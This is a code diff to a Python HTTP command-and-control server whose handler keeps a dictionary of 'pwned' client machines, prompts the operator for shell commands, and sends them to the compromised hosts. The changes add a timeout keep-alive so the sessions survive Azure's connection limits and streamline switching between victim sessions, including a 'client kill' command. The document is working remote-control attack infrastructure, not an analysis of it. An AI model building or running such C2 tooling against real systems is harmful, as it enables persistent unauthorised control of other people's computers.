@@ -3,7 +3,8 @@
 from http import server
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
-from settings import CWD_RESPONSE, PORT, CMD_REQUEST, RESPONSE, RESPONSE_KEY, BIND_ADDR
+from inputimeout import inputimeout, TimeoutOccurred
+from settings import CWD_RESPONSE, PORT, CMD_REQUEST, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR
 
 class C2Handler(BaseHTTPRequestHandler):
     """This is a child class of the BaseHTTPRequestHandler class.
@@ -48,8 +49,22 @@ class C2Handler(BaseHTTPRequestHandler):
             # If the client is in pwned_dict, and it is also our active session:
             elif client == pwned_dict[active_session]:
 
+                # If INPUT_TIMEOUT is set, run inputimeout instead of regular input
+                if INPUT_TIMEOUT:
+
+                    # Azure kills a waiting HTTP GET session after 4 minutes, so we must handle input with a timeout
+                    try:
+                        # Collect the command to run on the client; set Linux style promt as well
+                        command = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ", timeout=INPUT_TIMEOUT)
+
+                    # If timeout occurs on our input, do a simple command to trigger a new connection
+                    except TimeoutOccurred:
+                        command = KEEP_ALIVE_CMD
+
                 # Collect the command to run on the client; set Linux style promt as well
-                command = input(f"{client_account}@{client_hostname}:{cwd}$ ")
+                else:
+                    # Collect the command to run on the client; set Linux style promt as well
+                    command = input(f"{client_account}@{client_hostname}:{cwd}$ ")
 
                 # Write the command back to the client as a response; must utf-8 encode
                 try:
@@ -59,31 +74,11 @@ class C2Handler(BaseHTTPRequestHandler):
                 # If an exception occurs, notify and remove the active session from the dictionary
                 except BrokenPipeError:
                     print(f"{client_account}@{client_hostname} has disconnected!\n")
-                    del pwned_dict[active_session]
+                    get_new_session()
 
-                    # If the dictionary is empty, re-initialize variables to their starting values
-                    if not pwned_dict:
-                        print("Waiting for new connection.\n")
-                        pwned_id = 0
-                        active_session = 1
-                    else:
-                        #Display sessions in our dictionary and choose one of them to switch over to
-                        while True:
-                            print(*pwned_dict.items(), sep="\n")
-                            try:
-                                new_session = int(input("\n Choose a session number to make active: "))
-                            except ValueError:
-                                print("\nYou must choose a pwned id of one of the sessions shown on the screem\n")
-                                continue
-
-                            # Ensure we enter a pwned_id that is in our pwnd_dict and set active_session to it
-                            if new_session in pwned_dict:
-                                active_session = new_session
-                                print(f"\nActive session is now {pwned_dict[active_session]}")
-                                break
-                            else:
-                                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
-                                continue
+                # If we have just killed a client, try to get a new session to set active
+                if command.startswith("client kill"):
+                    get_new_session()
 
             # The client is in pwned_dict, but it is not our active session:
             else:
